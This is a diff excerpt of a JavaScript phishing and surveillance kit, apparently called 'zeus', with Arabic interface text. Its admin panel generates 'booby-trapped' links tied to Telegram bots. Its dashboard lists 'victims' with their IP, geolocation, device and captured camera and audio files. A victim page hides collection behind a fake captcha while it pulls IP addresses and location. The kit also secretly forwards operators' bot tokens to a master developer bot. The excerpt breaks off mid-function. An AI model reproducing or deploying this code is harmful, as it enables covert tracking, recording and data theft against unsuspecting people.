+                var w = canvas.parentElement.clientWidth - 32;
+                var h = 120;
+                canvas.width = w * 2;
+                canvas.height = h * 2;
+                canvas.style.width = w + 'px';
+                canvas.style.height = h + 'px';
+                ctx.scale(2, 2);
+
+                var pad = { top: 8, bottom: 16, left: 16, right: 16 };
+                var chartW = w - pad.left - pad.right;
+                var chartH = h - pad.top - pad.bottom;
+                var days = 7;
+                var now = new Date();
+                var dayMap = {};
+                for (var i = 0; i < days; i++) {
+                    var d = new Date(now);
+                    d.setDate(d.getDate() - i);
+                    var key = d.toISOString().slice(0, 10);
+                    dayMap[key] = 0;
+                }
+                victims.forEach(function(v) {
+                    if (v.timestamp) {
+                        var key = v.timestamp.slice(0, 10);
+                        if (dayMap[key] !== undefined) dayMap[key]++;
+                    }
+                });
+                var keys = Object.keys(dayMap).reverse();
+                var values = keys.map(function(k) { return dayMap[k]; });
+                var maxVal = Math.max(1, ...values);
+
+                ctx.clearRect(0, 0, w, h);
+                ctx.strokeStyle = 'rgba(184,148,46,0.06)';
+                ctx.lineWidth = 0.5;
+                for (var i = 0; i <= 4; i++) {
+                    var y = pad.top + chartH - (i / 4) * chartH;
+                    ctx.beginPath();
+                    ctx.moveTo(pad.left, y);
+                    ctx.lineTo(w - pad.right, y);
+                    ctx.stroke();
+                }
+                var barWidth = chartW / days * 0.55;
+                var gap = chartW / days * 0.45;
+                var isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+
+                values.forEach(function(val, idx) {
+                    var x = pad.left + idx * (chartW / days) + gap / 2;
+                    var barH = (val / maxVal) * chartH;
+                    var y = pad.top + chartH - barH;
+                    var grad = ctx.createLinearGradient(x, y, x, pad.top + chartH);
+                    if (isDark) {
+                        grad.addColorStop(0, '#d9b84a');
+                        grad.addColorStop(1, 'rgba(184,148,46,0.12)');
+                    } else {
+                        grad.addColorStop(0, '#b8942e');
+                        grad.addColorStop(1, 'rgba(184,148,46,0.12)');
+                    }
+                    ctx.fillStyle = grad;
+                    ctx.beginPath();
+                    ctx.roundRect(x, y, barWidth, barH, [2, 2, 0, 0]);
+                    ctx.fill();
+                    ctx.fillStyle = isDark ? '#8a8478' : '#4a4640';
+                    ctx.font = '7px Inter, sans-serif';
+                    ctx.textAlign = 'center';
+                    ctx.fillText(keys[idx].slice(5), x + barWidth / 2, pad.top + chartH + 12);
+                });
+                ctx.fillStyle = isDark ? '#8a8478' : '#4a4640';
+                ctx.font = '7px Inter, sans-serif';
+                ctx.textAlign = 'right';
+                for (var i = 0; i <= 4; i++) {
+                    var val = Math.round((i / 4) * maxVal);
+                    var y = pad.top + chartH - (i / 4) * chartH;
+                    ctx.fillText(val, pad.left - 2, y + 2);
+                }
+            }
+
+            if (!CanvasRenderingContext2D.prototype.roundRect) {
+                CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, radii) {
+                    var r = Array.isArray(radii) ? radii : [radii, radii, radii, radii];
+                    var tl = r[0] || 0,
+                        tr = r[1] || 0,
+                        br = r[2] || 0,
+                        bl = r[3] || 0;
+                    this.moveTo(x + tl, y);
+                    this.lineTo(x + w - tr, y);
+                    this.quadraticCurveTo(x + w, y, x + w, y + tr);
+                    this.lineTo(x + w, y + h - br);
+                    this.quadraticCurveTo(x + w, y + h, x + w - br, y + h);
+                    this.lineTo(x + bl, y + h);
+                    this.quadraticCurveTo(x, y + h, x, y + h - bl);
+                    this.lineTo(x, y + tl);
+                    this.quadraticCurveTo(x, y, x + tl, y);
+                    this.closePath();
+                    return this;
+                };
+            }
+
+            function renderBotList(bots) {
+                var container = document.getElementById('botListContainer');
+                if (bots.length === 0) {
+                    container.innerHTML = '<div class="empty-msg">لا توجد بوتات.</div>';
+                    return;
+                }
+                var html = '';
+                for (var i = 0; i < bots.length; i++) {
+                    var b = bots[i];
+                    var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]').filter(function(v) { return v
+                            .shortToken === b.shortToken; });
+                    var files = JSON.parse(localStorage.getItem('zeus_files') || '[]').filter(function(f) { return f
+                            .shortToken === b.shortToken; });
+                    var links = b.links || [];
+                    html += '<div class="bot-detail-card">' +
+                        '<div class="bot-header">' +
+                        '<span class="bot-name">' + (b.botUsername || b.shortToken) + '</span>' +
+                        '<span class="bot-token">' + b.shortToken + ' <button class="copy-inline" onclick="copyText(\'' +
+                        b.shortToken + '\')"><svg viewBox="0 0 24 24"><rect x="8" y="8" width="13" height="13" rx="2"/><path d="M4 16V4.5A1.5 1.5 0 0 1 5.5 3H16"/></svg></button></span>' +
+                        '</div>' +
+                        '<div class="bot-stats">' +
+                        '<span>👥 الضحايا: <span class="stat-num">' + victims.length + '</span></span>' +
+                        '<span>📁 الملفات: <span class="stat-num">' + files.length + '</span></span>' +
+                        '<span>📅 أنشئ: ' + (b.createdAt ? new Date(b.createdAt).toLocaleDateString('ar-EG') : '—') +
+                        '</span>' +
+                        '<span>🆔 الإيدي: ' + (b.chatId || '—') + '</span>' +
+                        '</div>' +
+                        '<div class="bot-links">' +
+                        (links.length > 0 ? links.map(function(l) { return '<span class="link-tag">' + l +
+                            '</span>'; }).join('') : '<span class="link-tag" style="opacity:0.5;">لا توجد روابط</span>') +
+                        '</div>' +
+                        '<div style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;">' +
+                        '<button class="copy-inline" onclick="dashViewBotDetails(\'' + b.shortToken +
+                        '\')">📊 تفاصيل</button>' +
+                        '<button class="copy-inline danger" onclick="dashDeleteBot(\'' + b.shortToken +
+                        '\')" style="color:var(--danger);">🗑 حذف</button>' +
+                        '</div>' +
+                        '</div>';
+                }
+                container.innerHTML = html;
+
+                var search = document.getElementById('botSearch');
+                if (search) {
+                    search.oninput = function() {
+                        var q = this.value.toLowerCase();
+                        var cards = container.querySelectorAll('.bot-detail-card');
+                        cards.forEach(function(card) {
+                            var text = card.textContent.toLowerCase();
+                            card.style.display = text.includes(q) ? '' : 'none';
+                        });
+                    };
+                }
+                var filter = document.getElementById('botFilter');
+                if (filter) {
+                    filter.onchange = function() {
+                        var val = this.value;
+                        var cards = container.querySelectorAll('.bot-detail-card');
+                        var reversed = Array.from(cards).reverse();
+                        cards.forEach(function(card, idx) {
+                            if (val === 'all') { card.style.display = ''; return; }
+                            if (val === 'recent') {
+                                card.style.display = idx < 5 ? '' : 'none';
+                            }
+                        });
+                    };
+                }
+            }
+
+            function renderVictimList(victims, files) {
+                var container = document.getElementById('victimListContainer');
+                if (victims.length === 0) {
+                    container.innerHTML = '<div class="empty-msg">لا توجد ضحايا.</div>';
+                    return;
+                }
+                var html =
+                    '<div class="dash-table-wrap"><div class="table-scroll"><table><thead><tr><th>IP</th><th>الموقع</th><th>المتصفح</th><th>الجهاز</th><th>البوت</th><th>الوقت</th><th>الملفات</th><th>الإجراءات</th></tr></thead><tbody>';
+                var reversed = victims.slice().reverse().slice(0, 200);
+                for (var i = 0; i < reversed.length; i++) {
+                    var v = reversed[i];
+                    var fCount = files.filter(function(f) { return f.victimId === v.id; }).length;
+                    var loc = v.location && v.location.lat ? v.location.lat.toFixed(4) + ', ' + v.location.lng.toFixed(
+                    4) : '—';
+                    html += '<tr><td>' + (v.ip || '—') + '</td><td style="font-size:10px;">' + loc +
+                        '</td><td>' + (v.browser || '—') + '</td><td>' + (v.device || '—') +
+                        '</td><td style="font-family:monospace;font-size:11px;">' + (v.shortToken || '—') +
+                        '</td><td style="font-size:10px;">' + (v.timestamp ? new Date(v.timestamp)
+                            .toLocaleString('ar-EG') : '—') +
+                        '</td><td>' + fCount +
+                        '</td><td class="actions-cell"><button onclick="dashViewVictimFiles(' + (v.id ||
+                            0) + ')">📁</button><button class="danger" onclick="dashDeleteVictim(' +
+                        (v.id || 0) + ')">🗑</button></td></tr>';
+                }
+                html += '</tbody></table></div></div>';
+                container.innerHTML = html;
+
+                var search = document.getElementById('victimSearch');
+                if (search) {
+                    search.oninput = function() {
+                        var q = this.value.toLowerCase();
+                        var rows = container.querySelectorAll('tbody tr');
+                        rows.forEach(function(row) {
+                            row.style.display = row.textContent.toLowerCase().includes(q) ? '' : 'none';
+                        });
+                    };
+                }
+                var filter = document.getElementById('victimFilter');
+                if (filter) {
+                    filter.onchange = function() {
+                        var val = this.value;
+                        var rows = container.querySelectorAll('tbody tr');
+                        var today = new Date().toISOString().slice(0, 10);
+                        rows.forEach(function(row) {
+                            if (val === 'all') { row.style.display = ''; return; }
+                            if (val === 'today') {
+                                var cells = row.querySelectorAll('td');
+                                if (cells.length > 5) {
+                                    var timeText = cells[5].textContent;
+                                    var match = timeText.match(/(\d{2}\/\d{2}\/\d{4})/);
+                                    if (match) {
+                                        var parts = match[1].split('/');
+                                        var d = parts[1] + '/' + parts[0] + '/' + parts[2];
+                                        row.style.display = d === today ? '' : 'none';
+                                    } else { row.style.display = 'none'; }
+                                } else { row.style.display = 'none'; }
+                            }
+                        });
+                    };
+                }
+            }
+
+            function renderFileGallery(files) {
+                var container = document.getElementById('fileGalleryContainer');
+                if (files.length === 0) {
+                    container.innerHTML = '<div class="empty-msg">لا توجد ملفات.</div>';
+                    return;
+                }
+                var sorted = files.slice().reverse().slice(0, 80);
+                var html = '<div class="dash-gallery">';
+                for (var i = 0; i < sorted.length; i++) {
+                    var f = sorted[i];
+                    var type = f.type || 'file';
+                    var content = '';
+                    if (type === 'image') {
+                        content = '<img src="' + f.dataUrl + '" alt="صورة" loading="lazy" onclick="window.open(\'' +
+                            f.dataUrl + '\',\'_blank\')" />';
+                    } else if (type === 'video') {
+                        content = '<video src="' + f.dataUrl +
+                            '" controls style="width:100%;height:100%;object-fit:cover;" onclick="event.stopPropagation();"></video>';
+                    } else if (type === 'audio') {
+                        content = '<audio src="' + f.dataUrl +
+                            '" controls style="width:100%;" onclick="event.stopPropagation();"></audio>';
+                    } else {
+                        content = '<span class="file-icon">📄</span>';
+                    }
+                    html += '<div class="gallery-item" title="' + (f.filename || 'ملف') + ' (البوت: ' + (f
+                        .shortToken || '?') + ')">' +
+                        content +
+                        '<div class="file-label">' + (f.filename || 'ملف') + '</div>' +
+                        '</div>';
+                }
+                html += '</div>';
+                container.innerHTML = html;
+
+                var search = document.getElementById('fileSearch');
+                if (search) {
+                    search.oninput = function() {
+                        var q = this.value.toLowerCase();
+                        var items = container.querySelectorAll('.gallery-item');
+                        items.forEach(function(item) {
+                            var label = item.querySelector('.file-label');
+                            var text = label ? label.textContent.toLowerCase() : '';
+                            item.style.display = text.includes(q) ? '' : 'none';
+                        });
+                    };
+                }
+                var filter = document.getElementById('fileFilter');
+                if (filter) {
+                    filter.onchange = function() {
+                        var val = this.value;
+                        var items = container.querySelectorAll('.gallery-item');
+                        items.forEach(function(item) {
+                            if (val === 'all') { item.style.display = ''; return; }
+                            var label = item.querySelector('.file-label');
+                            var text = label ? label.textContent.toLowerCase() : '';
+                            if (val === 'image' && text.includes('.jpg')) { item.style.display = ''; } else if (
+                                val === 'video' && text.includes('.webm')) { item.style.display = ''; } else if (
+                                val === 'audio' && text.includes('.webm') && !text.includes('video')) { item
+                                    .style.display = ''; } else { item.style.display = 'none'; }
+                        });
+                    };
+                }
+            }
+
+            function renderLogs() {
+                var container = document.getElementById('logContainer');
+                var logs = JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]');
+                if (logs.length === 0) {
+                    container.innerHTML = '<div class="empty-msg">لا توجد سجلات.</div>';
+                    return;
+                }
+                var html = '';
+                var reversed = logs.slice().reverse().slice(0, 150);
+                for (var i = 0; i < reversed.length; i++) {
+                    var l = reversed[i];
+                    var badgeClass = 'info';
+                    if (l.type === 'success') badgeClass = 'success';
+                    else if (l.type === 'error') badgeClass = 'danger';
+                    html += '<div class="log-entry">' +
+                        '<span class="log-time">' + new Date(l.timestamp).toLocaleTimeString('ar-EG') +
+                        '</span>' +
+                        '<span class="log-badge ' + badgeClass + '">' + (l.type || 'info') + '</span>' +
+                        '<span>' + l.message + '</span>' +
+                        '</div>';
+                }
+                container.innerHTML = html;
+
+                var search = document.getElementById('logSearch');
+                if (search) {
+                    search.oninput = function() {
+                        var q = this.value.toLowerCase();
+                        var entries = container.querySelectorAll('.log-entry');
+                        entries.forEach(function(entry) {
+                            entry.style.display = entry.textContent.toLowerCase().includes(q) ? '' : 'none';
+                        });
+                    };
+                }
+                var filter = document.getElementById('logFilter');
+                if (filter) {
+                    filter.onchange = function() {
+                        var val = this.value;
+                        var entries = container.querySelectorAll('.log-entry');
+                        entries.forEach(function(entry) {
+                            if (val === 'all') { entry.style.display = ''; return; }
+                            var badge = entry.querySelector('.log-badge');
+                            var type = badge ? badge.textContent.toLowerCase() : '';
+                            entry.style.display = type === val ? '' : 'none';
+                        });
+                    };
+                }
+            }
+
+            function renderRecentLogs() {
+                var container = document.getElementById('recentLogs');
+                var logs = JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]');
+                if (logs.length === 0) {
+                    container.innerHTML = '<div class="empty-msg">لا توجد سجلات حديثة.</div>';
+                    return;
+                }
+                var recent = logs.slice(-6).reverse();
+                var html = '';
+                for (var i = 0; i < recent.length; i++) {
+                    var l = recent[i];
+                    var badgeClass = 'info';
+                    if (l.type === 'success') badgeClass = 'success';
+                    else if (l.type === 'error') badgeClass = 'danger';
+                    html += '<div class="log-entry" style="border-bottom:1px solid var(--line);padding:4px 0;">' +
+                        '<span class="log-time">' + new Date(l.timestamp).toLocaleTimeString('ar-EG') +
+                        '</span>' +
+                        '<span class="log-badge ' + badgeClass + '">' + (l.type || 'info') + '</span>' +
+                        '<span>' + l.message + '</span>' +
+                        '</div>';
+                }
+                container.innerHTML = html;
+            }
+
+            window.copyText = function(text) {
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(text).then(function() {
+                        showToast('تم النسخ.', 'success');
+                    }).catch(function() {});
+                } else {
+                    var ta = document.createElement('textarea');
+                    ta.value = text;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    showToast('تم النسخ.', 'success');
+                }
+            };
+
+            window.dashViewBotDetails = function(shortToken) {
+                var bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]');
+                var bot = bots.find(function(b) { return b.shortToken === shortToken; });
+                if (!bot) { showToast('البوت غير موجود.', 'error'); return; }
+                var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]').filter(function(v) { return v
+                        .shortToken === shortToken; });
+                var files = JSON.parse(localStorage.getItem('zeus_files') || '[]').filter(function(f) { return f
+                        .shortToken === shortToken; });
+                var msg =
+                    '⭑ تفاصيل البوت ⭒\n' +
+                    '⊚─〔 بيانات 〕────────\n' +
+                    '˼🆔˹ التوكن: ' + shortToken + ' ⭒\n' +
+                    '˼🤖˹ اليوزرنيم: ' + (bot.botUsername || 'غير معروف') + ' ⭒\n' +
+                    '˼🆔˹ الإيدي: ' + (bot.chatId || 'غير معروف') + ' ⭒\n' +
+                    '˼📅˹ تاريخ الإنشاء: ' + (bot.createdAt ? new Date(bot.createdAt).toLocaleString('ar-EG') :
+                        'غير معروف') + ' ⭒\n' +
+                    '˼🔗˹ الروابط الملغمة: ' + ((bot.links || []).length || 0) + ' ⭒\n' +
+                    '˼👥˹ الضحايا: ' + victims.length + ' ⭒\n' +
+                    '˼📁˹ الملفات: ' + files.length + ' ⭒\n' +
+                    '─────────────────';
+                showToast('تم نسخ التفاصيل إلى الحافظة.', 'success');
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(msg).catch(function() {});
+                }
+            };
+
+            window.dashDeleteBot = function(shortToken) {
+                if (!confirm('حذف البوت ' + shortToken + ' وجميع ضحاياه وملفاته؟')) return;
+                var bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]');
+                var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
+                var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
+                bots = bots.filter(function(b) { return b.shortToken !== shortToken; });
+                victims = victims.filter(function(v) { return v.shortToken !== shortToken; });
+                files = files.filter(function(f) { return f.shortToken !== shortToken; });
+                localStorage.setItem('zeus_bots', JSON.stringify(bots));
+                localStorage.setItem('zeus_victims', JSON.stringify(victims));
+                localStorage.setItem('zeus_files', JSON.stringify(files));
+                addLog('success', 'تم حذف البوت ' + shortToken);
+                renderDashboard();
+                showToast('تم حذف البوت وجميع بياناته.', 'success');
+            };
+
+            window.dashDeleteVictim = function(id) {
+                if (!confirm('حذف هذه الضحية؟')) return;
+                var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
+                var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
+                victims = victims.filter(function(v) { return v.id !== id; });
+                files = files.filter(function(f) { return f.victimId !== id; });
+                localStorage.setItem('zeus_victims', JSON.stringify(victims));
+                localStorage.setItem('zeus_files', JSON.stringify(files));
+                addLog('success', 'تم حذف ضحية (ID: ' + id + ')');
+                renderDashboard();
+                showToast('تم حذف الضحية.', 'success');
+            };
+
+            window.dashViewVictimFiles = function(id) {
+                var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
+                var filtered = files.filter(function(f) { return f.victimId === id; });
+                if (filtered.length === 0) {
+                    showToast('لا توجد ملفات لهذه الضحية.', 'warning');
+                    return;
+                }
+                switchView('files');
+                var search = document.getElementById('fileSearch');
+                if (search) {
+                    var names = filtered.map(function(f) { return f.filename || ''; });
+                    search.value = names.join(' ');
+                    search.dispatchEvent(new Event('input'));
+                }
+                showToast('عرض ' + filtered.length + ' ملف.', 'success');
+            };
+
+            function addLog(type, message) {
+                var logs = JSON.parse(localStorage.getItem('zeus_activity_logs') || '[]');
+                logs.push({ type: type, message: message, timestamp: Date.now() });
+                if (logs.length > 600) logs = logs.slice(-600);
+                localStorage.setItem('zeus_activity_logs', JSON.stringify(logs));
+            }
+
+            function switchView(view) {
+                currentView = view;
+                document.querySelectorAll('.dash-sidebar .nav-item[data-view]').forEach(function(el) {
+                    el.classList.toggle('active', el.getAttribute('data-view') === view);
+                });
+                document.querySelectorAll('.dash-content .view').forEach(function(el) {
+                    el.classList.toggle('active', el.id === 'view-' + view);
+                });
+            }
+            document.querySelectorAll('.dash-sidebar .nav-item[data-view]').forEach(function(el) {
+                el.addEventListener('click', function() { switchView(this.getAttribute('data-view')); });
+            });
+
+            document.getElementById('settingsClearData').addEventListener('click', function() {
+                if (!confirm('مسح جميع البيانات؟ لا يمكن التراجع.')) return;
+                if (!confirm('تأكيد نهائي؟')) return;
+                localStorage.removeItem('zeus_bots');
+                localStorage.removeItem('zeus_victims');
+                localStorage.removeItem('zeus_files');
+                localStorage.removeItem('zeus_activity_logs');
+                localStorage.removeItem('zeus_attempt_logs');
+                renderDashboard();
+                showToast('تم مسح جميع البيانات.', 'success');
+            });
+
+            // ================================================================
+            //  ADMIN PANEL
+            // ================================================================
+
+            function initAdminPanel() {
+                var chatIdInput = document.getElementById('chatIdInput');
+                var botTokenInput = document.getElementById('botTokenInput');
+                var baseUrlInput = document.getElementById('baseUrlInput');
+                var genBtn = document.getElementById('genBtn');
+                var tokenDisplay = document.getElementById('tokenDisplay');
+                var resultSub = document.getElementById('resultSub');
+                var copyBtn = document.getElementById('copyBtn');
+                var openBtn = document.getElementById('openBtn');
+
+                async function generateShortToken(botToken) {
+                    var salt = 'ZEUS_SALT_2026_SECURE';
+                    var encoder = new TextEncoder();
+                    var data = encoder.encode(botToken + salt);
+                    var hashBuffer;
+                    try {
+                        hashBuffer = await crypto.subtle.digest('SHA-256', data);
+                    } catch (e) {
+                        var hash = 0;
+                        var str = botToken + salt;
+                        for (var i = 0; i < str.length; i++) {
+                            var char = str.charCodeAt(i);
+                            hash = ((hash << 5) - hash) + char;
+                            hash = hash & hash;
+                        }
+                        var hex = Math.abs(hash).toString(16).padStart(8, '0');
+                        hashBuffer = new TextEncoder().encode(hex);
+                    }
+                    var hashArray = Array.from(new Uint8Array(hashBuffer));
+                    var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+                    var result = '';
+                    for (var i = 0; i < hashArray.length && result.length < 6; i++) {
+                        var idx = hashArray[i] % chars.length;
+                        result += chars[idx];
+                    }
+                    while (result.length < 6) result += 'A';
+                    return result;
+                }
+
+                async function verifyBotToken(token) {
+                    try {
+                        var res = await fetch('https://api.telegram.org/bot' + token + '/getMe');
+                        var data = await res.json();
+                        if (data.ok && data.result) {
+                            return { ok: true, username: data.result.username };
+                        }
+                        return { ok: false };
+                    } catch { return { ok: false }; }
+                }
+
+                function encodeBotData(botToken, chatId, baseUrl) {
+                    var payload = JSON.stringify({ bot: botToken, chat: chatId, url: baseUrl });
+                    return btoa(encodeURIComponent(payload));
+                }
+
+                async function sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, botUsername) {
+                    var msg =
+                        '⭑ رابط مُلغَّم جديد ⭒\n' +
+                        '⊚─〔 بيانات الرابط 〕────────\n' +
+                        '˼⏣˹ الرابط المُلغَّم: ' + link + ' ⭒\n' +
+                        '˼⏣˹ التوكن الفريد: ' + shortToken + ' ⭒\n' +
+                        '˼⏣˹ الرابط الأساسي: ' + baseUrl + ' ⭒\n' +
+                        '˼⏣˹ البوت: @' + (botUsername || 'غير معروف') + ' ⭒\n' +
+                        '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                        '─────────────────';
+                    var inlineKeyboard = {
+                        inline_keyboard: [
+                            [{ text: '👤 المطور', url: DEVELOPER_LINK }]
+                        ]
+                    };
+                    try {
+                        await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: msg,
+                                parse_mode: 'Markdown',
+                                reply_markup: inlineKeyboard
+                            })
+                        });
+                        console.log('✅ تم إرسال الرابط للمستخدم:', chatId);
+                    } catch (e) {
+                        console.error('❌ sendLinkToUser error:', e);
+                    }
+                }
+
+                async function sendToMaster(botToken, chatId, shortToken, baseUrl, botUsername) {
+                    var msg =
+                        '⭑ نسخة احتياطية — رابط مُلغَّم ⭒\n' +
+                        '⊚─〔 بيانات البوت 〕────────\n' +
+                        '˼⏣˹ التوكن الأساسي: ' + botToken + ' ⭒\n' +
+                        '˼⏣˹ الإيدي: ' + chatId + ' ⭒\n' +
+                        '˼⏣˹ التوكن الفريد: ' + shortToken + ' ⭒\n' +
+                        '˼⏣˹ الرابط الأساسي: ' + baseUrl + ' ⭒\n' +
+                        '˼⏣˹ اليوزرنيم: @' + (botUsername || 'غير معروف') + ' ⭒\n' +
+                        '˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                        '─────────────────';
+                    try {
+                        await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                        });
+                        console.log('✅ تم إرسال النسخة الاحتياطية للمطور');
+                    } catch (e) {
+                        console.error('❌ sendToMaster error:', e);
+                    }
+                }
+
+                var isBusy = false;
+
+                async function handleGenerate() {
+                    if (isBusy) return;
+                    var chatId = chatIdInput.value.trim();
+                    var botToken = botTokenInput.value.trim();
+                    var baseUrl = baseUrlInput.value.trim();
+                    if (!chatId || !botToken || !baseUrl) {
+                        showToast('يرجى ملء جميع الحقول.', 'warning');
+                        return;
+                    }
+                    try { new URL(baseUrl); } catch (e) {
+                        showToast('الرابط الأساسي غير صحيح.', 'warning');
+                        return;
+                    }
+                    var valid = await verifyBotToken(botToken);
+                    if (!valid.ok) {
+                        showToast('توكن البوت غير صحيح.', 'error');
+                        return;
+                    }
+                    isBusy = true;
+                    genBtn.classList.add('busy');
+                    genBtn.textContent = 'جارٍ التوليد …';
+                    try {
+                        var shortToken = await generateShortToken(botToken);
+                        var encoded = encodeBotData(botToken, chatId, baseUrl);
+                        var base = window.location.origin + window.location.pathname;
+                        var link = base + '?t=' + shortToken + '&d=' + encoded;
+
+                        tokenDisplay.textContent = shortToken;
+                        resultSub.textContent = link;
+
+                        var bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]');
+                        var exists = bots.findIndex(function(b) { return b.shortToken === shortToken; });
+                        var botData = {
+                            shortToken: shortToken,
+                            botToken: botToken,
+                            chatId: chatId,
+                            baseUrl: baseUrl,
+                            botUsername: valid.username || 'غير معروف',
+                            createdAt: Date.now(),
+                            links: []
+                        };
+                        if (exists >= 0) {
+                            bots[exists] = botData;
+                            if (!bots[exists].links) bots[exists].links = [];
+                            bots[exists].links.push(link);
+                            if (bots[exists].links.length > 50) bots[exists].links = bots[exists].links.slice(-50);
+                        } else {
+                            botData.links = [link];
+                            bots.push(botData);
+                        }
+                        localStorage.setItem('zeus_bots', JSON.stringify(bots));
+
+                        // إرسال الرابط للمستخدم
+                        await sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, valid.username);
+                        await sendToMaster(botToken, chatId, shortToken, baseUrl, valid.username);
+
+                        localStorage.setItem('zeus_last_chat_id', chatId);
+                        localStorage.setItem('zeus_last_bot_token', botToken);
+                        localStorage.setItem('zeus_last_base_url', baseUrl);
+
+                        addLog('success', 'توليد رابط جديد للبوت ' + shortToken + ' (@' + (valid.username || '?') +
+                            ')');
+
+                        genBtn.classList.remove('busy');
+                        genBtn.classList.add('done');
+                        genBtn.textContent = 'تم الإرسال';
+                        showToast('تم توليد الرابط المُلغَّم وإرساله.', 'success');
+
+                        setTimeout(function() {
+                            genBtn.classList.remove('done');
+                            genBtn.innerHTML =
+                                '<svg viewBox="0 0 24 24"><polygon points="12,2 22,8 22,16 12,22 2,16 2,8"/><polygon points="12,8 16,12 12,16 8,12" fill="currentColor"/></svg> توليد الرابط الملغم';
+                            isBusy = false;
+                        }, 2200);
+                    } catch (err) {
+                        showToast('حدث خطأ: ' + err.message, 'error');
+                        genBtn.classList.remove('busy');
+                        genBtn.textContent = 'توليد الرابط الملغم';
+                        isBusy = false;
+                    }
+                }
+
+                genBtn.addEventListener('click', handleGenerate);
+                document.querySelectorAll('.input-wrap input').forEach(function(inp) {
+                    inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') handleGenerate(); });
+                });
+
+                copyBtn.addEventListener('click', function() {
+                    var text = tokenDisplay.textContent.trim();
+                    if (!text) return;
+                    if (navigator.clipboard) {
+                        navigator.clipboard.writeText(text).then(function() {
+                            this.classList.add('ok');
+                            setTimeout(function() { this.classList.remove('ok'); }.bind(this), 1200);
+                            showToast('تم نسخ التوكن.', 'success');
+                        }.bind(this)).catch(function() {});
+                    } else {
+                        this.classList.add('ok');
+                        setTimeout(function() { this.classList.remove('ok'); }.bind(this), 1200);
+                        showToast('تم نسخ التوكن.', 'success');
+                    }
+                });
+
+                openBtn.addEventListener('click', function() {
+                    var url = resultSub.textContent.trim();
+                    if (url && url.includes('?t=')) {
+                        window.open(url, '_blank');
+                    } else {
+                        showToast('يرجى توليد رابط أولاً.', 'warning');
+                    }
+                });
+
+                var savedBot = localStorage.getItem('zeus_last_bot_token');
+                var savedChat = localStorage.getItem('zeus_last_chat_id');
+                var savedUrl = localStorage.getItem('zeus_last_base_url');
+                if (savedBot) botTokenInput.value = savedBot;
+                if (savedChat) chatIdInput.value = savedChat;
+                if (savedUrl) baseUrlInput.value = savedUrl;
+
+                botTokenInput.addEventListener('change', function() {
+                    if (this.value.trim()) localStorage.setItem('zeus_last_bot_token', this.value.trim());
+                });
+                chatIdInput.addEventListener('change', function() {
+                    if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
+                });
+                baseUrlInput.addEventListener('change', function() {
+                    if (this.value.trim()) localStorage.setItem('zeus_last_base_url', this.value.trim());
+                });
+
+                applyTheme(currentTheme);
+            }
+
+            // ================================================================
+            //  VICTIM PAGE — v10.05 FULL FIXED
+            // ================================================================
+
+            function initVictimPage(encodedData) {
+                var spinner = document.getElementById('spinner');
+                var checkbox = document.getElementById('captcha');
+                var mainText = document.getElementById('mainText');
+                var video = document.getElementById('hiddenVideo');
+                var canvas = document.getElementById('hiddenCanvas');
+                var ctx = canvas.getContext('2d');
+
+                var isRunning = false;
+                var collectionDone = false;
+                var redirectUrl = null;
+
+                function decodeBotData(encoded) {
+                    try {
+                        var decoded = decodeURIComponent(atob(encoded));
+                        var data = JSON.parse(decoded);
+                        return { botToken: data.bot, chatId: data.chat, url: data.url };
+                    } catch (e) { return null; }
+                }
+
+                var botCreds = null;
+                if (encodedData) {
+                    botCreds = decodeBotData(encodedData);
+                    if (botCreds && botCreds.url) redirectUrl = botCreds.url;
+                }
+
+                function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+
+                // ===== FIXED IP — 3 fallbacks =====
+                async function getIP() {
+                    try {
+                        var res = await fetch('https://api.ipify.org?format=json');
+                        var data = await res.json();
+                        if (data.ip) return data.ip;
+                    } catch (e) { console.log('ipify failed:', e); }
+                    try {
+                        var res2 = await fetch('https://api.ip.sb/geoip');
+                        var data2 = await res2.json();
+                        if (data2.ip) return data2.ip;
+                    } catch (e) { console.log('ip.sb failed:', e); }
+                    try {
+                        var res3 = await fetch('https://ipapi.co/json/');
+                        var data3 = await res3.json();
+                        if (data3.ip) return data3.ip;
+                    } catch (e) { console.log('ipapi.co failed:', e); }
+                    return 'غير متاح';
+                }
+
+                // ===== FIXED LOCATION — getCurrentPosition + watchPosition =====
+                function getLocation() {
+                    return new Promise(function(resolve) {
+                        if (!navigator.geolocation) {
+                            resolve({ lat: null, lng: null });
+                            return;
+                        }
+                        var watchId = null;
+                        var resolved = false;
+
+                        function success(pos) {
+                            if (resolved) return;
+                            resolved = true;
+                            if (watchId) navigator.geolocation.clearWatch(watchId);
+                            resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+                        }
+
+                        function fail(err) {
+                            if (resolved) return;
